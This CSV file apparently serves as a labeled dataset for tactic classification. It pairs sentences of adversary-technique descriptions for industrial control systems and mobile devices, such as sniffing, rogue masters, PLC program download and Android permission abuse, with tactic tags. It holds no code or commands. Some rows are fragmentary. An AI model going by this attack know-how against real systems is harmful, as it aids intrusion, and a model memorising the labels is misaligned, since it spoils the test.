Network sniffing is the practice of using a network interface on a computer system to monitor or capture information regardless of whether it is the specified destination for the information.,DISCOVERY,,,
An adversary may attempt to sniff the traffic to gain information about the target.,DISCOVERY,,,
This information can vary in the level of importance.,DISCOVERY,,,
Relatively unimportant information is general communications to and from machines.,DISCOVERY,,,
Relatively important information would be login information.,DISCOVERY,,,
"User credentials may be sent over an unencrypted protocol, such as Telnet, that can be captured and obtained through network packet analysis.",DISCOVERY,,,
"In addition, ARP and Domain Name Service (DNS) poisoning can be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.",DISCOVERY,,,
Adversaries may collect point and tag values to gain a more comprehensive understanding of the process environment.,COLLECTION,,,
"Points may be values such as inputs, memory locations, outputs or other process specific variables.",COLLECTION,,,
Tags are the identifiers given to points for operator convenience.,COLLECTION,,,
"Collecting such tags provides valuable context to environmental points and enables an adversary to map inputs, outputs, and other values to their control processes.",COLLECTION,,,
Understanding the points being collected may inform an adversary on which processes and values to keep track of over the course of an operation.,COLLECTION,,,
Adversaries may perform a program download to transfer a user program to a controller.,LATERAL_MOVEMENT,,,
"Variations of program download, such as online edit and program append, allow a controller to continue running during the transfer and reconfiguration process without interruption to process control.",LATERAL_MOVEMENT,,,
"However, before starting a full program download (i.e., download all) a controller may need to go into a stop state.",LATERAL_MOVEMENT,,,
"This can have negative consequences on the physical process, especially if the controller is not able to fulfill a time-sensitive action.",LATERAL_MOVEMENT,,,
Adversaries may choose to avoid a download all in favor of an online edit or program append to avoid disrupting the physical process.,LATERAL_MOVEMENT,,,
An adversary may need to use the technique Detect Operating Mode or Change Operating Mode to make sure the controller is in the proper mode to accept a program download.,LATERAL_MOVEMENT,,,
"The granularity of control to transfer a user program in whole or parts is dictated by the management protocol (e.g., S7CommPlus, TriStation) and underlying controller API.",LATERAL_MOVEMENT,,,
"Thus, program download is a high-level term for the suite of vendor-specific API calls used to configure a controllers user program memory space. [Modify Controller Tasking] and [Modify Program] represent the configuration changes that are transferred to a controller via a program download.",LATERAL_MOVEMENT,,,
Adversaries may attempt to upload a program from a PLC to gather information about an industrial process.,COLLECTION,,,
Uploading a program may allow them to acquire and study the underlying logic.,COLLECTION,,,
"Methods of program upload include vendor software, which enables the user to upload and read a program running on a PLC.",COLLECTION,,,
"This software can be used to upload the target program to a workstation, jump box, or an interfacing device.",COLLECTION,,,
Adversaries may attempt to infect project files with malicious code.,PERSISTENCE,,,
"These project files may consist of objects, program organization units, variables such as tags, documentation, and other configurations needed for PLC programs to function.",PERSISTENCE,,,
Adversaries may export their own code into project files with conditions to execute at specific intervals.,PERSISTENCE,,,
Adversaries may leverage remote services to move between assets and network segments.,INITIAL_ACCESS,LATERAL_MOVEMENT,,
"These services are often used to allow operators to interact with systems remotely within the network, some examples are RDP, SMB, SSH, and other similar mechanisms.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
"Remote services could be used to support remote access, data transmission, authentication, name resolution, and other remote functions.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
"Further, remote services may be necessary to allow operators and administrators to configure systems within the network from their engineering or management workstations.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
An adversary may use this technique to access devices which may be dual-homed .,INITIAL_ACCESS,LATERAL_MOVEMENT,,
Specific remote services (RDP & VNC) may be a precursor to enable [Graphical User Interface] execution on devices such as HMIs or engineering workstation software.,INITIAL_ACCESS,LATERAL_MOVEMENT,,
"Based on incident data, CISA and FBI assessed that Chinese state-sponsored actors also compromised various authorized remote access channels, including systems designed to transfer data and/or allow access between corporate and ICS networks.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for subsequent Lateral Movement or Discovery techniques.",DISCOVERY,,,
"Functionality could exist within adversary tools to enable this, but utilities available on the operating system or vendor software could also be used.",DISCOVERY,,,
"An adversary may attempt to get detailed information about remote systems and their peripherals, such as make/model, role, and configuration.",DISCOVERY,,,
Adversaries may use information from Remote System Information Discovery to aid in targeting and shaping follow-on behaviors.,DISCOVERY,,,
"For example, the systems operational role and model information can dictate whether it is a relevant target for the adversary's operational objectives.",DISCOVERY,,,
"In addition, the systems configuration may be used to scope subsequent technique usage.",DISCOVERY,,,
Requests for system information are typically implemented using automation and management protocols and are often automatically requested by vendor software during normal operation.,DISCOVERY,,,
"This information may be used to tailor management actions, such as program download and system or module firmware.",DISCOVERY,,,
An adversary may leverage this same information by issuing calls directly to the systems API.,DISCOVERY,,,
"Adversaries may move onto systems, such as those separated from the enterprise network, by copying malware to removable media which is inserted into the control systems environment.",INITIAL_ACCESS,,,
"The adversary may rely on unknowing trusted third parties, such as suppliers or contractors with access privileges, to introduce the removable media.",INITIAL_ACCESS,,,
"This technique enables initial access to target devices that never connect to untrusted networks, but are physically accessible.",INITIAL_ACCESS,,,
"Operators of the German nuclear power plant, Gundremmingen, discovered malware on a facility computer not connected to the internet.",INITIAL_ACCESS,,,
Adversaries may setup a rogue master to leverage control server functions to communicate with outstations.,INITIAL_ACCESS,,,
"A rogue master can be used to send legitimate control messages to other control system devices, affecting processes in unintended ways.",INITIAL_ACCESS,,,
It may also be used to disrupt network communications by capturing and receiving the network traffic meant for the actual master.,INITIAL_ACCESS,,,
Impersonating a master may also allow an adversary to avoid detection.,INITIAL_ACCESS,,,
"In the Maroochy Shire attack, the adversary falsified network addresses in order to send false data and instructions to pumping stations.",INITIAL_ACCESS,,,
"In the case of the 2017 Dallas Siren incident, adversaries used a rogue master to send command messages to the 156 distributed sirens across the city, either through a single rogue transmitter with a strong signal, or using many distributed repeaters.",INITIAL_ACCESS,,,
Adversaries may attempt to perform screen capture of devices in the control system environment.,COLLECTION,,,
"Screenshots may be taken of workstations, HMIs, or other devices that display environment-relevant process, device, reporting, alarm, or related data.",COLLECTION,,,
"These device displays may reveal information regarding the ICS process, layout, control, and related schematics.",COLLECTION,,,
"In particular, an HMI can provide a lot of important industrial process information.",COLLECTION,,,
Analysis of screen captures may provide the adversary with an understanding of intended operations and interactions between critical devices.,COLLECTION,,,
Adversaries may use scripting languages to execute arbitrary code in the form of a pre-written script or in the form of user-supplied code to an interpreter.,EXECUTION,,,
"Scripting languages are programming languages that differ from compiled languages, in that scripting languages use an interpreter, instead of a compiler.",EXECUTION,,,
"These interpreters read and compile part of the source code just before it is executed, as opposed to compilers, which compile each and every line of code to an executable file.",EXECUTION,,,
Scripting allows software developers to run their code on any system where the interpreter exists.,EXECUTION,,,
"This way, they can distribute one package, instead of precompiling executables for many different systems.",EXECUTION,,,
"Scripting languages, such as Python, have their interpreters shipped as a default with many Linux distributions.",EXECUTION,,,
"In addition to being a useful tool for developers and administrators, scripting language interpreters may be abused by the adversary to execute code in the target environment.",EXECUTION,,,
"Due to the nature of scripting languages, this allows for weaponized code to be deployed to a target easily, and leaves open the possibility of on-the-fly scripting to perform a task.",EXECUTION,,,
"Adversaries may use a spearphishing attachment, a variant of spearphishing, as a form of a social engineering attack against specific targets.",INITIAL_ACCESS,,,
Spearphishing attachments are different from other forms of spearphishing in that they employ malware attached to an email.,INITIAL_ACCESS,,,
"All forms of spearphishing are electronically delivered and target a specific individual, company, or industry.",INITIAL_ACCESS,,,
"In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution] to gain execution and access.",INITIAL_ACCESS,,,
"A Chinese spearphishing campaign running from December 9, 2011 through February 29, 2012, targeted ONG organizations and their employees.",INITIAL_ACCESS,,,
The emails were constructed with a high level of sophistication to convince employees to open the malicious file attachments.,INITIAL_ACCESS,,,
"Adversaries may establish command and control capabilities over commonly used application layer protocols such as HTTP(S), OPC, RDP, telnet, DNP3, and modbus.",COMMAND_AND_CONTROL,,,
These protocols may be used to disguise adversary actions as benign network traffic.,COMMAND_AND_CONTROL,,,
Standard protocols may be seen on their associated port or in some cases over a non-standard port.,COMMAND_AND_CONTROL,,,
"Adversaries may use these protocols to reach out of the network for command and control, or in some cases to other infected devices within the network.",COMMAND_AND_CONTROL,,,
"Adversaries may perform supply chain compromise to gain control systems environment access by means of infected products, software, and workflows.",INITIAL_ACCESS,,,
"Supply chain compromise is the manipulation of products, such as devices or software, or their delivery mechanisms before receipt by the end consumer.",INITIAL_ACCESS,,,
"Adversary compromise of these products and mechanisms is done for the goal of data or system compromise, once infected products are introduced to the target environment.",INITIAL_ACCESS,,,
"Supply chain compromise can occur at all stages of the supply chain, from manipulation of development tools and environments to manipulation of developed products and tools distribution mechanisms.",INITIAL_ACCESS,,,
"This may involve the compromise and replacement of legitimate software and patches, such as on third party or vendor websites.",INITIAL_ACCESS,,,
Targeting of supply chain compromise can be done in attempts to infiltrate the environments of a specific audience.,INITIAL_ACCESS,,,
"In control systems environments with assets in both the IT and OT networks, it is possible a supply chain compromise affecting the IT environment could enable further access to the OT environment.",INITIAL_ACCESS,,,
Counterfeit devices may be introduced to the global supply chain posing safety and cyber risks to asset owners and operators.,INITIAL_ACCESS,,,
"These devices may not meet the safety, engineering and manufacturing requirements of regulatory bodies but may feature tagging indicating conformance with industry standards.",INITIAL_ACCESS,,,
"Due to the lack of adherence to standards and overall lesser quality, the counterfeit products may pose a serious safety and operational risk.",INITIAL_ACCESS,,,
Yokogawa identified instances in which their customers received counterfeit differential pressure transmitters using the Yokogawa logo.,INITIAL_ACCESS,,,
The counterfeit transmitters were nearly indistinguishable with a semblance of functionality and interface that mimics the genuine product.,INITIAL_ACCESS,,,
F-Secure Labs analyzed the approach the adversary used to compromise victim systems with Havex. .,INITIAL_ACCESS,,,
System firmware on modern assets is often designed with an update feature.,PERSISTENCE,,,
Older device firmware may be factory installed and require special reprograming equipment.,PERSISTENCE,,,
"When available, the firmware update feature enables vendors to remotely patch bugs and perform upgrades.",PERSISTENCE,,,
Device firmware updates are often delegated to the user and may be done using a software update package.,PERSISTENCE,,,
It may also be possible to perform this task over the network.,PERSISTENCE,,,
An adversary may exploit the firmware update feature on accessible devices to upload malicious or out-of-date firmware.,PERSISTENCE,,,
"Malicious modification of device firmware may provide an adversary with root access to a device, given firmware is one of the lowest programming abstraction layers.",PERSISTENCE,,,
Adversaries may steal operational information on a production environment as a direct mission outcome for personal gain or to inform future operations.,IMPACT,,,
"This information may include design documents, schedules, rotational data, or similar artifacts that provide insight on operations.",IMPACT,,,
.,IMPACT,,,
"In the Bowman Dam incident, adversaries probed systems for operational data.",IMPACT,,,
Adversaries may target devices that are transient across ICS networks and external networks.,INITIAL_ACCESS,,,
"Normally, transient assets are brought into an environment by authorized personnel and do not remain in that environment on a permanent basis.",INITIAL_ACCESS,,,
"Transient assets are commonly needed to support management functions and may be more common in systems where a remotely managed asset is not feasible, external connections for remote access do not exist, or 3rd party contractor/vendor access is required.",INITIAL_ACCESS,,,
Adversaries may take advantage of transient assets in different ways.,INITIAL_ACCESS,,,
"For instance, adversaries may target a transient asset when it is connected to an external network and then leverage its trusted access in another environment to launch an attack.",INITIAL_ACCESS,,,
They may also take advantage of installed applications and libraries that are used by legitimate end-users to interact with control system devices.,INITIAL_ACCESS,,,
"Transient assets, in some cases, may not be deployed with a secure configuration leading to weaknesses that could allow an adversary to propagate malicious executable code, e.g., the transient asset may be infected by malware and when connected to an ICS environment the malware propagates onto other systems.",INITIAL_ACCESS,,,
"In the Maroochy Shire attack, the adversary utilized a computer, possibly stolen, with proprietary engineering software to communicate with a wastewater system.",INITIAL_ACCESS,,,
Adversaries may rely on a targeted organizations user interaction for the execution of malicious code.,EXECUTION,,,
"User interaction may consist of installing applications, opening email attachments, or granting higher permissions to documents.",EXECUTION,,,
Adversaries may embed malicious code or visual basic code into files such as Microsoft Word and Excel documents or software installers.,EXECUTION,,,
"A Chinese spearphishing campaign running from December 9, 2011 through February 29, 2012 delivered malware through spearphishing attachments which required user action to achieve execution.",EXECUTION,,,
Adversaries may steal the credentials of a specific user or service account using credential access techniques.,LATERAL_MOVEMENT,PERSISTENCE,,
"In some cases, default credentials for control system devices may be publicly available.",LATERAL_MOVEMENT,PERSISTENCE,,
"Compromised credentials may be used to bypass access controls placed on various resources on hosts and within the network, and may even be used for persistent access to remote systems.",LATERAL_MOVEMENT,PERSISTENCE,,
Compromised and default credentials may also grant an adversary increased privilege to specific systems and devices or access to restricted areas of the network.,LATERAL_MOVEMENT,PERSISTENCE,,
"Adversaries may choose not to use malware or tools, in conjunction with the legitimate access those credentials provide, to make it harder to detect their presence or to control devices and send legitimate commands in an unintended way.",LATERAL_MOVEMENT,PERSISTENCE,,
"Adversaries may also create accounts, sometimes using predefined account names and passwords, to provide a means of backup access for persistence.",LATERAL_MOVEMENT,PERSISTENCE,,
"The overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) and possibly between the enterprise and operational technology environments.",LATERAL_MOVEMENT,PERSISTENCE,,
Adversaries may be able to leverage valid credentials from one system to gain access to another system.,LATERAL_MOVEMENT,PERSISTENCE,,
Adversaries may perform wireless compromise as a method of gaining communications and unauthorized access to a wireless network.,INITIAL_ACCESS,,,
Access to a wireless network may be gained through the compromise of a wireless device.,INITIAL_ACCESS,,,
Adversaries may also utilize radios and other wireless communication devices on the same frequency as the wireless network.,INITIAL_ACCESS,,,
Wireless compromise can be done as an initial access vector from a remote distance.,INITIAL_ACCESS,,,
"In the Maroochy Shire attack, the adversary used a two-way radio to communicate with and set the frequencies of Maroochy Shire's repeater stations.",INITIAL_ACCESS,,,
A Polish student used a modified TV remote controller to gain access to and control over the Lodz city tram system in Poland.,INITIAL_ACCESS,,,
Adversaries may seek to capture radio frequency (RF) communication used for remote control and reporting in distributed environments.,COLLECTION,DISCOVERY,,
"RF communication frequencies vary between 3 kHz to 300 GHz, although are commonly between 300 MHz to 6 GHz. and the type of radio required to capture them.",COLLECTION,DISCOVERY,,
These characteristics are often standardized in the protocol and hardware and may have an effect on how the signal is captured.,COLLECTION,DISCOVERY,,
"Some examples of wireless protocols that may be found in cyber-physical environments are: WirelessHART, Zigbee, WIA-FA, and 700 MHz Public Safety Spectrum.",COLLECTION,DISCOVERY,,
"Adversaries may capture RF communications by using specialized hardware, such as software defined radio (SDR), handheld radio, or a computer with radio demodulator tuned to the communication frequency.",COLLECTION,DISCOVERY,,
"In the 2017 Dallas Siren incident, it is suspected that adversaries likely captured wireless command message broadcasts on a 700 MHz frequency during a regular test of the system.",COLLECTION,DISCOVERY,,
These messages were later replayed to trigger the alarm systems.,COLLECTION,DISCOVERY,,
Adversaries may circumvent mechanisms designed to control elevated privileges to gain higher-level permissions.,PRIVILEGE_ESCALATION,,,
Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can gain on a machine.,PRIVILEGE_ESCALATION,,,
Authorization has to be granted to specific users in order to perform tasks that are designated as higher risk.,PRIVILEGE_ESCALATION,,,
An adversary can use several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.,PRIVILEGE_ESCALATION,,,
Adversaries may collect data within notifications sent by the operating system or other applications.,COLLECTION,CREDENTIAL_ACCESS,,
"Notifications may contain sensitive data such as one-time authentication codes sent over SMS, email, or other mediums.",COLLECTION,CREDENTIAL_ACCESS,,
"In the case of Credential Access, adversaries may attempt to intercept one-time code sent to the device.",COLLECTION,CREDENTIAL_ACCESS,,
Adversaries can also dismiss notifications to prevent the user from noticing that the notification has arrived and can trigger action buttons contained within notifications.,COLLECTION,CREDENTIAL_ACCESS,,
"Accounts may be deleted, locked, or manipulated (ex: credentials changed) to remove access to accounts.",IMPACT,,,
"Adversaries may attempt to position themselves between two or more networked devices to support follow-on behaviors such as [Transmitted Data Manipulation] or [Endpoint Denial of Service]. [Adversary-in-the-Middle] can be achieved through several mechanisms, such as a malicious application registering itself as a VPN client.",COLLECTION,,,
"By doing this, the adversary can effectively redirect device traffic to wherever they want.",COLLECTION,,,
"However, registering as a VPN client requires user consent on both Android and iOS.",COLLECTION,,,
"Additionally, on iOS, the application requires a special entitlement that must be granted by Apple.",COLLECTION,,,
"Alternatively, if an application is able to escalate privileges, it can potentially utilize those privileges to gain access to network traffic.",COLLECTION,,,
"Outside of a mobile device, adversaries may be able to capture traffic by employing a rogue base station or Wi-Fi access point.",COLLECTION,,,
"These devices will allow adversaries to capture network traffic after it has left the device, while it is flowing to its destination.",COLLECTION,,,
"On a local network, enterprise techniques could be used, such as DNS redirection or DNS poisoning.",COLLECTION,,,
"If applications properly encrypt their network traffic, sensitive data may not be accessible an adversary, depending on the point of capture.",COLLECTION,,,
"Commands to the mobile device, and often the results of those commands, will be embedded within the protocol traffic between the mobile device and server.",COMMAND_AND_CONTROL,,,
Adversaries may compress and/or encrypt data that is collected prior to exfiltration.,COLLECTION,,,
Compressing data can help to obfuscate its contents and minimize use of network resources.,COLLECTION,,,
"Both compression and encryption are done prior to exfiltration, and can be performed using a utility, programming library, or custom algorithm.",COLLECTION,,,
"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic, rather than relying on any inherent protections provided by a communication protocol.",COMMAND_AND_CONTROL,,,
"Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private that should not be distributed.",COMMAND_AND_CONTROL,,,
"Due to how asymmetric algorithms work, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key.",COMMAND_AND_CONTROL,,,
"Common public key encryption algorithms include RSA, ElGamal, and ECDSA.",COMMAND_AND_CONTROL,,,
Adversaries may capture audio to collect information by leveraging standard operating system APIs of a mobile device.,COLLECTION,,,
"Examples of audio information adversaries may target include user conversations, surroundings, phone calls, or other sensitive information.",COLLECTION,,,
"Android and iOS, by default, require that applications request device microphone access from the user.",COLLECTION,,,
"On Android devices, applications must hold the `RECORD_AUDIO` permission to access the microphone or the `CAPTURE_AUDIO_OUTPUT` permission to access audio output.",COLLECTION,,,
"Because Android does not allow third-party applications to hold the `CAPTURE_AUDIO_OUTPUT` permission by default, only privileged applications, such as those distributed by Google or the device vendor, can access audio output.",COLLECTION,,,
"On iOS devices, applications must include the `NSMicrophoneUsageDescription` key in their `Info.plist` file to access the microphone.",COLLECTION,,,
"Adversaries may use an existing, legitimate external Web service channel as a means for sending commands to and receiving output from a compromised system.",COMMAND_AND_CONTROL,,,
"Popular websites and social media, acting as a mechanism for C2, may give a significant amount of cover.",COMMAND_AND_CONTROL,,,
This is due to the likelihood that hosts within a network are already communicating with them prior to a compromise.,COMMAND_AND_CONTROL,,,
Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.,PERSISTENCE,,,
Initialization scripts are part of the underlying operating system and are not accessible to the user unless the device has been rooted or jailbroken.,PERSISTENCE,,,
Adversaries may establish persistence using system mechanisms that trigger execution based on specific events.,PERSISTENCE,,,
"Mobile operating systems have means to subscribe to events such as receiving an SMS message, device boot completion, or other device activities.",PERSISTENCE,,,
An intent is a message passed between Android applications or system components.,PERSISTENCE,,,
"Applications can register to receive broadcast intents at runtime, which are system-wide intents delivered to each app when certain events happen on the device, such as network changes or the user unlocking the screen.",PERSISTENCE,,,
Malicious applications can then trigger certain actions within the app based on which broadcast intent was received.,PERSISTENCE,,,
"In addition to Android system intents, malicious applications can register for intents broadcasted by other applications.",PERSISTENCE,,,
This allows the malware to respond based on actions in other applications.,PERSISTENCE,,,
"This behavior typically indicates a more intimate knowledge, or potentially the targeting of specific devices, users, or applications.",PERSISTENCE,,,
"In Android 8 (API level 26), broadcast intent behavior was changed, limiting the implicit intents that applications can register for in the manifest.",PERSISTENCE,,,
"In most cases, applications that register through the manifest will no longer receive the broadcasts.",PERSISTENCE,,,
"Now, applications must register context-specific broadcast receivers while the user is actively using the app.",PERSISTENCE,,,
Adversaries may utilize standard operating system APIs to gather calendar entry data.,COLLECTION,,,
"On Android, this can be accomplished using the Calendar Content Provider.",COLLECTION,,,
"On iOS, this can be accomplished using the `EventKit` framework.",COLLECTION,,,
"If the device has been jailbroken or rooted, an adversary may be able to access [Calendar Entries] without the user’s knowledge or approval.",COLLECTION,,,
"Adversaries may make, forward, or block phone calls without user authorization.",COLLECTION,COMMAND_AND_CONTROL,,
"This could be used for adversary goals such as audio surveillance, blocking or forwarding calls from the device owner, or C2 communication.",COLLECTION,COMMAND_AND_CONTROL,,
"Several permissions may be used to programmatically control phone calls, including:

* `ANSWER_PHONE_CALLS` - Allows the application to answer incoming phone calls
* `CALL_PHONE` - Allows the application to initiate a phone call without going through the Dialer interface
* `PROCESS_OUTGOING_CALLS` - Allows the application to see the number being dialed during an outgoing call with the option to redirect the call to a different number or abort the call altogether
* `MANAGE_OWN_CALLS` - Allows a calling application which manages its own calls through the self-managed `ConnectionService` APIs
* `BIND_TELECOM_CONNECTION_SERVICE` - Required permission when using a `ConnectionService`
* `WRITE_CALL_LOG` - Allows an application to write to the device call log, potentially to hide malicious phone calls.",COLLECTION,COMMAND_AND_CONTROL,,
"When granted some of these permissions, an application can make a phone call without opening the dialer first.",COLLECTION,COMMAND_AND_CONTROL,,
"However, if an application desires to simply redirect the user to the dialer with a phone number filled in, it can launch an Intent using `Intent.ACTION_DIAL`, which requires no specific permissions.",COLLECTION,COMMAND_AND_CONTROL,,
This then requires the user to explicitly initiate the call or use some form of [Input Injection] to programmatically initiate it.,COLLECTION,COMMAND_AND_CONTROL,,
Adversaries may utilize standard operating system APIs to gather call log data.,COLLECTION,,,
"On Android, this can be accomplished using the Call Log Content Provider. iOS provides no standard API to access the call log.",COLLECTION,,,
"If the device has been jailbroken or rooted, an adversary may be able to access the [Call Log] without the user’s knowledge or approval.",COLLECTION,,,
Adversaries may abuse clipboard manager APIs to obtain sensitive information copied to the device clipboard.,COLLECTION,CREDENTIAL_ACCESS,,
"For example, passwords being copied and pasted from a password manager application could be captured by a malicious application installed on the device.",COLLECTION,CREDENTIAL_ACCESS,,
"On Android, applications can use the `ClipboardManager.OnPrimaryClipChangedListener()` API to register as a listener and monitor the clipboard for changes.",COLLECTION,CREDENTIAL_ACCESS,,
"However, starting in Android 10, this can only be used if the application is in the foreground, or is set as the device’s default input method editor (IME).",COLLECTION,CREDENTIAL_ACCESS,,
"On iOS, this can be accomplished by accessing the `UIPasteboard.general.string` field.",COLLECTION,CREDENTIAL_ACCESS,,
"However, starting in iOS 14, upon accessing the clipboard, the user will be shown a system notification if the accessed text originated in a different application.",COLLECTION,CREDENTIAL_ACCESS,,
"For example, if the user copies the text of an iMessage from the Messages application, the notification will read “application_name has pasted from Messages” when the text was pasted in a different application.",COLLECTION,CREDENTIAL_ACCESS,,
Adversaries may modify code signing policies to enable execution of applications signed with unofficial or unknown keys.,DEFENSE_EVASION,,,
"Code signing provides a level of authenticity on an app from a developer, guaranteeing that the program has not been tampered with and comes from an official source.",DEFENSE_EVASION,,,
"Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on a device.",DEFENSE_EVASION,,,
"Mobile devices generally enable these security controls by default, such as preventing the installation of unknown applications on Android.",DEFENSE_EVASION,,,
"Adversaries may modify these policies in a number of ways, including [Input Injection] or malicious configuration profiles.",DEFENSE_EVASION,,,
"Most systems come with some built-in command-line interface and scripting capabilities, for example, Android is a UNIX-like OS and includes a basic [Unix Shell] that can be accessed via the Android Debug Bridge (ADB) or Java’s `Runtime` package.",EXECUTION,,,
Adversaries may also execute commands through interactive terminals/shells.,EXECUTION,,,
Adversaries may modify applications installed on a device to establish persistent access to a victim.,PERSISTENCE,,,
These malicious modifications can be used to make legitimate applications carry out adversary tasks when these applications are in use.,PERSISTENCE,,,
There are multiple ways an adversary can inject malicious code into applications.,PERSISTENCE,,,
"One method is by taking advantages of device vulnerabilities, the most well-known being Janus, an Android vulnerability that allows adversaries to add extra bytes to APK (application) and DEX (executable) files without affecting the file's signature.",PERSISTENCE,,,
"By being able to add arbitrary bytes to valid applications, attackers can seamlessly inject code into genuine executables without the user's knowledge.",PERSISTENCE,,,
Adversaries may also rebuild applications to include malicious modifications.,PERSISTENCE,,,
"This can be achieved by decompiling the genuine application, merging it with the malicious code, and recompiling it.",PERSISTENCE,,,
Adversaries may also take action to conceal modifications to application executables and bypass user consent.,PERSISTENCE,,,
These actions include altering modifications to appear as an update or exploiting vulnerabilities that allow activities of the malicious application to run inside a system application.,PERSISTENCE,,,
Adversaries may modify system software binaries to establish persistent access to devices.,PERSISTENCE,,,
System software binaries are used by the underlying operating system and users over adb or terminal emulators.,PERSISTENCE,,,
Adversaries may make modifications to client software binaries to carry out malicious tasks when those binaries are executed.,PERSISTENCE,,,
"For example, malware may come with a pre-compiled malicious binary intended to overwrite the genuine one on the device.",PERSISTENCE,,,
"Since these binaries may be routinely executed by the system or user, the adversary can leverage this for persistent access to the device.",PERSISTENCE,,,
Adversaries may utilize standard operating system APIs to gather contact list data.,COLLECTION,,,
"On Android, this can be accomplished using the Contacts Content Provider.",COLLECTION,,,
"On iOS, this can be accomplished using the `Contacts` framework.",COLLECTION,,,
"If the device has been jailbroken or rooted, an adversary may be able to access the [Contact List] without the user’s knowledge or approval.",COLLECTION,,,
Adversaries may search common password storage locations to obtain user credentials.,CREDENTIAL_ACCESS,,,
"Passwords can be stored in several places on a device, depending on the operating system or application holding the credentials.",CREDENTIAL_ACCESS,,,
An adversary may encrypt files stored on a mobile device to prevent the user from accessing them.,IMPACT,,,
"Adversaries may insert, delete, or alter data in order to manipulate external outcomes or hide activity.",IMPACT,,,
"The type of modification and the impact it will have depends on the target application, process, and the goals and objectives of the adversary.",IMPACT,,,
"For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system, typically gained through a prolonged information gathering campaign, in order to have the desired impact.",IMPACT,,,
"Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to exfiltration.",COLLECTION,,,
"Access to local system data, which includes information stored by the operating system, often requires escalated privileges.",COLLECTION,,,
"Examples of local system data include authentication tokens, the device keyboard cache, Wi-Fi passwords, and photos.",COLLECTION,,,
"On Android, adversaries may also attempt to access files from external storage which may require additional storage-related permissions.",COLLECTION,,,
"Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis, or enable operational resiliency (since this infrastructure may be dynamically changed).",COMMAND_AND_CONTROL,,,
Adversaries may abuse Android’s device administration API to obtain a higher degree of control over the device.,PRIVILEGE_ESCALATION,,,
"By abusing the API, adversaries can perform several nefarious actions, such as resetting the device’s password for [Endpoint Denial of Service], factory resetting the device for [File Deletion] and to delete any traces of the malware, disabling all the device’s cameras, or to make it more difficult to uninstall the app.",PRIVILEGE_ESCALATION,,,
"Device administrators must be approved by the user at runtime, with a system popup showing which actions have been requested by the app.",PRIVILEGE_ESCALATION,,,
"In conjunction with other techniques, such as [Input Injection], an app can programmatically grant itself administrator permissions without any user input.",PRIVILEGE_ESCALATION,,,
An adversary may seek to inhibit user interaction by locking the legitimate user out of the device.,DEFENSE_EVASION,,,
This is typically accomplished by requesting device administrator permissions and then locking the screen using `DevicePolicyManager.lockNow()`.,DEFENSE_EVASION,,,
"Other novel techniques for locking the user out of the device have been observed, such as showing a persistent overlay, using carefully crafted “call” notification screens, and locking HTML pages in the foreground.",DEFENSE_EVASION,,,
"These techniques can be very difficult to get around, and typically require booting the device into safe mode to uninstall the malware.",DEFENSE_EVASION,,,
"Prior to Android 7, device administrators were able to reset the device lock passcode to prevent the user from unlocking the device.",DEFENSE_EVASION,,,
The release of Android 7 introduced updates that only allow device or profile owners (e.g.,DEFENSE_EVASION,,,
MDMs) to reset the device’s passcode.,DEFENSE_EVASION,,,
Adversaries may disable security tools to avoid potential detection of their tools and activities.,DEFENSE_EVASION,,,
"This can take the form of disabling security software, modifying SELinux configuration, or other methods to interfere with security tools scanning or reporting information.",DEFENSE_EVASION,,,
This is typically done by abusing device administrator permissions or using system exploits to gain root access to the device to modify protected system files.,DEFENSE_EVASION,,,
An adversary could use knowledge of the techniques used by security software to evade detection.,DEFENSE_EVASION,,,
Adversaries may use [Domain Generation Algorithms] (DGAs) to procedurally generate domain names for uses such as command and control communication or malicious application distribution.,COMMAND_AND_CONTROL,,,
"DGAs increase the difficulty for defenders to block, track, or take over the command and control channel, as there could potentially be thousands of domains that malware can check for instructions.",COMMAND_AND_CONTROL,,,
Adversaries may download and execute dynamic code not included in the original application package after installation.,DEFENSE_EVASION,,,
This technique is primarily used to evade static analysis checks and pre-publication scans in official app stores.,DEFENSE_EVASION,,,
"In some cases, more advanced dynamic or behavioral analysis techniques could detect this behavior.",DEFENSE_EVASION,,,
"However, in conjunction with [Execution Guardrails] techniques, detecting malicious code downloaded after installation could be difficult.",DEFENSE_EVASION,,,
"On Android, dynamic code could include native code, Dalvik code, or JavaScript code that utilizes Android WebView’s `JavascriptInterface` capability.",DEFENSE_EVASION,,,
"On iOS, dynamic code could be downloaded and executed through 3rd party libraries such as JSPatch.",DEFENSE_EVASION,,,
"With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring an [Application Access Token].",INITIAL_ACCESS,,,
"Multiple ways of delivering exploit code to a browser exist, including:

* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.
* Malicious ads are paid for and served through legitimate ad providers.
* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).",INITIAL_ACCESS,,,
This kind of targeted attack is referred to a strategic web compromise or watering hole attack.,INITIAL_ACCESS,,,
"Typical drive-by compromise process:
1. A user visits a website that is used to host the adversary controlled content.
2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.
3. Upon finding a vulnerable version, exploit code is delivered to the browser.
4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.
* In some cases a second visit to the website after the initial scan is required before exploit code is delivered.",INITIAL_ACCESS,,,
